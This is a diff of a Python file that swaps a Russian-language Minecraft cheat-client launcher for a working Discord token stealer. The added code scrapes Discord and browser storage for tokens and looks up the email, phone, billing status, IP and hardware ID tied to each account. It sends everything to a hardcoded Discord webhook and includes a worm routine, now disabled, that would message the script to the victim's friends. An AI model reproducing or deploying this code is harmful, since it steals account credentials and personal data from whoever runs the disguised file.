@@ -1,311 +1,200 @@
-  #loader by zmei
-    #loader by zmei
-      #loader by zmei
-        #loader by zmei161  
-          #loader by zmei
-            #loader by zmei
-              #loader by zmei161
-                #loader by zmei161
-                #loader by zmei161
-                #loader by zmei161
-                #loader by zmei161
-                
-import ctypes
-import functools
-import hashlib
-import inspect
-import json
 import os
-import os.path
-import subprocess
-import sys
-import time
-import zipfile
-  #loader by zmei
-  #loader by zmei
-  #loader by zmei
-  #loader by zmei
-import requests
-from colorama import init, Fore
-from tqdm import tqdm
+if os.name != "nt":
+    exit()
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from datetime import datetime
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from threading import Thread
+from time import sleep
+from sys import argv
+dt = datetime.now()
 
-ctypes.windll.kernel32.SetConsoleTitleA(b"Loader")
-init(autoreset=True)
-  #loader by zmei
-logo = [
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1424414317033291826/cn82iz_jKUWHXxvEOtA8gkaY-JQVzwhRMRa6YO95N80qVn0MOnO07BfQkbs03qfFztCF'
 
-    " ██╗  ██╗ █████╗ ██████╗ ████████╗ █████╗    █████╗ ██╗     ██╗███████╗███╗  ██╗████████╗",
-    " ██║ ██╔╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║     ██║██╔════╝████╗ ██║╚══██╔══╝",
-    " █████═╝ ██║  ██║██████╔╝   ██║   ███████║  ██║  ╚═╝██║     ██║█████╗  ██╔██╗██║   ██║",
-    " ██╔═██╗ ██║  ██║██╔══██╗   ██║   ██╔══██║  ██║  ██╗██║     ██║██╔══╝  ██║╚████║   ██║",
-    " ██║ ╚██╗╚█████╔╝██║  ██║   ██║   ██║  ██║  ╚█████╔╝███████╗██║███████╗██║ ╚███║   ██║",
-    " ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚════╝ ╚══════╝╚═╝╚══════╝╚═╝  ╚══╝   ╚═╝"
-]
-  #loader by zmei
-username = "Free User"
-till = "31.01.2999"
-build = "Free 1.16.5"
-last_update_date = "27.10.2024"
-loader_ver = "1.2"
-  #loader by zmei
-  #loader by zmei
-IGNORED_MODULES = []
-class MODULEENTRY32(ctypes.Structure):
-    _fields_ = [
-        ("dwSize", ctypes.c_ulong),
-        ("th32ModuleID", ctypes.c_ulong),
-        ("th32ProcessID", ctypes.c_ulong),
-        ("GlblcntUsage", ctypes.c_ulong),
-        ("ProccntUsage", ctypes.c_ulong),
-        ("modBaseAddr", ctypes.POINTER(ctypes.c_byte)),
-        ("modBaseSize", ctypes.c_ulong),
-        ("hModule", ctypes.c_void_p),
-        ("szModule", ctypes.c_char * 256),
-        ("szExePath", ctypes.c_char * 260)
-    ]
-  #loader by zmei
-def check_for_injection():
-    previous_modules = get_loaded_modules()
-  #loader by zmei
-    while True:
-        current_modules = get_loaded_modules()
-        new_modules = [module for module in current_modules if
-                       module not in previous_modules and module not in IGNORED_MODULES]
-        if new_modules:
-            print(" [!] Обнаружена попытка инжекта кода")
-            os.kill(os.getpid(), 9)
-        previous_modules = current_modules
-        time.sleep(0.001)
-  #loader by zmei
-def get_loaded_modules():
-    module_list = []
-    snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(0x00000008, 0)  # TH32CS_SNAPMODULE
-    if snapshot == -1:
-        return []
-  #loader by zmei
-    me32 = MODULEENTRY32()
-    me32.dwSize = ctypes.sizeof(MODULEENTRY32)
-  #loader by zmei
-    ret = ctypes.windll.kernel32.Module32First(snapshot, ctypes.byref(me32))
-    while ret != 0:
-        if me32.szExePath.endswith(b".dll"):
-            module_list.append(me32.szModule)
-        ret = ctypes.windll.kernel32.Module32Next(snapshot, ctypes.byref(me32))
-  #loader by zmei
-    ctypes.windll.kernel32.CloseHandle(snapshot)
-    return module_list
-  #loader by zmei
-def generate_hash(func):
-    source_code = inspect.getsource(func)
-    lines = source_code.splitlines()
-    non_decorator_lines = [line for line in lines if not line.strip().startswith('@')]
-    return hashlib.sha256('\n'.join(non_decorator_lines).encode("utf-8")).hexdigest()
-  #loader by zmei
-def verify_hash(original_hash):
-    def decorator(func):
-        @functools.wraps(func)
-        def wrapper(*args, **kwargs):
-            current_hash = generate_hash(func)
-            if current_hash != original_hash:
-                raise ValueError("Integrity check failed.")
-            return func(*args, **kwargs)
-  #loader by zmei
-        return wrapper
-  #loader by zmei
-    return decorator
-  #loader by zmei
-def execute_command(command, ram):
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Firefox"           : LOCAL + "\\Mozilla\\Firefox\\User Data\\Profiles",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Edge"              : LOCAL + "\\\Microsoft\\Edge\\User Data\\Default",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
+    "Vivaldi"            : LOCAL + "\\Vivaldi\\User Data\\User Data",
+
+}
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+def getuserdata(token):
     try:
-        subprocess.run(command)
-    except subprocess.CalledProcessError as e:
-        print(f" [!] Процесс не запустился, ошибка: {e}")
-  #loader by zmei
-def download_and_extract(url: str, extract_dir: str):
-    target_folder = os.path.join(extract_dir)
-    response = requests.get(url, stream=True)
-    filename = url.split('/')[-1].split(".zip")[0] + ".zip"
-    target_path = os.path.join(target_folder, filename)
-    total_size = int(response.headers.get('content-length', 0))
-    block_size = 1024
-    t = tqdm(total=total_size, unit='B', unit_scale=True, desc=filename, leave=True)
-    with open(target_path, 'wb') as file:
-        for data in response.iter_content(block_size):
-            t.update(len(data))
-            file.write(data)
-    t.close()
-  #loader by zmei
-    with zipfile.ZipFile(target_path, 'r') as zip_ref:
-        zip_ref.extractall(target_folder)
-        try:
-            os.remove(target_path)
-        except OSError:
-            pass
-  #loader by zmei
-config_path = "C:\\KortaClient\\config\\memory_config.json"
-def load_memory_config():
-    if os.path.exists(config_path):
-        with open(config_path, 'r') as file:
-            config = json.load(file)
-            return config.get("memory", "2048")
-    return "2048"
-  #loader by zmei
-def save_memory_config(memory):
-    config = {"memory": memory}
-    os.makedirs(os.path.dirname(config_path), exist_ok=True)
-    with open(config_path, 'w') as file:
-        json.dump(config, file)
-  #loader by zmei
-def ram_select():
-    default_memory = load_memory_config()
-    print(f" Текущее количество памяти: {default_memory} MB")
-    user_input = input(" Введите количество памяти в MB (по умолчанию 2048): ").strip()
-    if user_input.isdigit():
-        memory = user_input
-    else:
-        memory = default_memory
-    save_memory_config(memory)
-    print(f" Выбранное количество памяти: {memory} MB")
-    return memory
-  #loader by zmei
-  #loader by zmei
-  #loader by zmei
-def build_select():
-    print(Fore.RED + "╔════════════════════════╗")
-    print(Fore.RED + "║ Будет доступно позже...║")
-    print(Fore.RED + "╚════════════════════════╝")
-  #loader by zmei
-# ФУНКЦИЯ СТАРТА КЛИЕНТА
-def start():
-    if not os.path.isdir("C:\\KortaClient"):
-        os.mkdir("C:\\KortaClient")
-        print(" [!] Stage 1: Created main directory")
-        print(" [!] Stage 2: Downloading & extracting required files...")
-        download_and_extract(
-            "https://www.dropbox.com/scl/fi/39axga73lk4gzmo9g8ssm/client.zip?rlkey=dtr4wwmlv1w7e43ryv3dk9pyo&st=ak5do8re&dl=1",
-            "C:\\KortaClient\\")
-  #loader by zmei
-    while True:
-  #loader by zmei
-        memory_input = input(Fore.LIGHTGREEN_EX +" [>] Введите кол-во оперативной памяти (В гб): ")
-        print(f" Приятной Игры!")
-  #loader by zmei
-        try:
-            memory = int(memory_input)
-            print("[!] Stage 3: Launching client...")
-            launch_command = [
-                "C:\\KortaClient\\client\\jre-21.0.2\\bin\\java.exe",
-                f"-Xmx{memory}G",
-                "-Djava.library.path=C:\\KortaClient\\client\\natives",
-                "-cp",
-                "C:\\KortaClient\\client\\libraries\\*;C:\\KortaClient\\client\\Korta.jar",
-                "net.minecraft.client.main.Main",
-                "--username",
-                "korta",
-                "--width",
-                "854",
-                "--height",
-                "480",
-                "--version",
-                "xyipenis141",
-                "--gameDir",
-                "C:\\KortaClient\\game",
-                "--assetsDir",
-                "C:\\KortaClient\\client\\assets",
-                "--assetIndex",
-                "1.16",
-                "--accessToken",
-                "0"
-            ]
-            execute_command(launch_command, ram=memory)
-            break
-        except ValueError:
-            print(" [!] Введенное значение не является целым числом. Пожалуйста, попробуйте снова.")
-
-            execute_command(launch_command, ram=memory)
-            break
-        except ValueError:
-            print(" [!] Введенное значение не является целым числом. Пожалуйста, попробуйте снова.")
-  #loader by zmei
-def info():
-    print("  Информация:")
-    print("  ╔══════════════════════════════════════════╗")
-    print( f"  ║  Версия клиента: {build}             ║ ")
-    print( f"  ║  Имя пользователя: {username}             ║   ")
-    print( f"  ║  Подписка до: {till}                 ║  ")
-    print( f"  ║  Дата последнего обновления: {last_update_date}  ║   ")
-    print( f"  ║  Версия лоадера: {loader_ver}                     ║ ")
-    print( "  ╚══════════════════════════════════════════╝")
-  #loader by zmei
-def inform():
-    print(Fore.LIGHTGREEN_EX + f"╔══════════════════════════════════════════╗")
-    print(Fore.LIGHTGREEN_EX + f"║   Кодер & Создатель чита: zmei161        ║"),
-    print(Fore.LIGHTGREEN_EX + "║   Zmei ушел в запой.                     ║")
-    print(Fore.LIGHTGREEN_EX +"║   t.me/kortaclient                       ║")
-    print(Fore.LIGHTGREEN_EX + f"╚══════════════════════════════════════════╝")
-  #loader by zmei
-def sosal():
-    print(Fore.LIGHTWHITE_EX + " ╔══════════════════════════════════════════════╗")
-    print(Fore.LIGHTWHITE_EX + " ║ Change Log:                                  ║")
-    print(Fore.LIGHTWHITE_EX + " ║ 1.Изменен Дизайн.                            ║")
-    print(Fore.LIGHTWHITE_EX + " ║ 2.Изменен Функционал                         ║")
-    print(Fore.LIGHTWHITE_EX + " ║ 3.Изменен Код                                ║")
-    print(Fore.LIGHTWHITE_EX + " ╚══════════════════════════════════════════════╝")
-  #loader by zmei
-
-def selector():
-    while True:
-        enter = input(Fore.CYAN + " [>] Выберите пункт: ")
-        if enter == "1":
-            start()
-  #loader by zmei
-        elif enter == "0":
-            ram_select()
-            print(" Изменения сохранены...\nПерезапустите лоадер...\nЛоадер будет закрыт через 5 секунд...")
-            time.sleep(5)
-            sys.exit()
-
-        elif enter == "2":
-            build_select()
-  #loader by zmei
-        elif enter == "3":
-            info()
-  #loader by zmei
-        elif enter == "4":
-            inform()
-  #loader by zmei
-        elif enter == "5":
-            sosal()
-  #loader by zmei
-        else:
-            print(" Неккоректный выбор!")
-            print(f" [>] Выберите пункт: {enter}")
-  #loader by zmei
-  #loader by zmei
-  #loader by zmei
-  #loader by zmei
-# ФУНКЦИЯ АВТОРИЗАЦИИ AKA ИНИЦИЛИЗАЦИИ
-def auth():
-    for line in logo:
-        print(Fore.CYAN + line)
-    print(" Загрузка...")
-    time.sleep(3)
-    main_func()
-  #loader by zmei
-# MAIN ФУНКЦИЯ
-def main_func():
-    print("\n [>] Добро пожаловать!")
-    print(" ╔══════════════════════════════╗")
-    print(" ║ [1] Запуск клиента           ║  ")
-    print(" ║ [2] Выбор версии клиента     ║")
-    print(" ║ [3] Информация               ║")
-    print(" ║ [4] Разработчик              ║   ")
-    print(" ║ [5] Change Log               ║   ")
-    print(" ╚══════════════════════════════╝\n")
-    selector()
-  #loader by zmei
-if __name__ == '__main__':
-    auth()
-    while True:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+    except:
         pass
-        
-        #loader by zmei
+def gettokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+def getavatar(uid, aid):
+    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+    try:
+        urlopen(Request(url))
+    except:
+        url = url[:-4]
+    return url
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def getfriends(token):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+    except:
+        pass
+def getchat(token, uid):
+    try:
+        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+    except:
+        pass
+def has_payment_methods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+    except:
+        pass
+def send_message(token, chat_id, form_data):
+    try:
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+    except:
+        pass
+def spread(token, form_data, delay):
+    return # Remove to re-enabled
+    for friend in getfriends(token):
+        try:
+            chat_id = getchat(token, friend["id"])
+            send_message(token, chat_id, form_data)
+        except Exception as e:
+            pass
+        sleep(delay)
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    prevent_spam = True
+    self_spread = True
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = getip()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in gettokens(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getuserdata(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            avatar_id = user_data["avatar"]
+            avatar_url = getavatar(user_id, avatar_id)
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            flags = user_data.get("public_flags")
+            
+            billing = bool(has_payment_methods(token))
+            embed = {
+                "color": 0x5865f2,
+                "fields": [
+                    {
+                        "name": "**Account Info**",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**PC Info**",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": token,
+                        "inline": False
+                    },
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                    "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": "Hooked at • " + dt.strftime('%Y-%m-%d %H:%M:%S'),
+                }
+            }
+
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Nero’s CStealer",
+        "avatar_url": "https://i.hizliresim.com/9ftjid9.jpg"
+    }
+    try:
+        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
+    except:
+        pass
+    if self_spread:
+        for token in working:
+            with open(argv[0], encoding="utf-8") as file:
+                content = file.read()
+            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
+            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
+try:
+    main()
+except Exception as e:
+    print(e)
+    pass
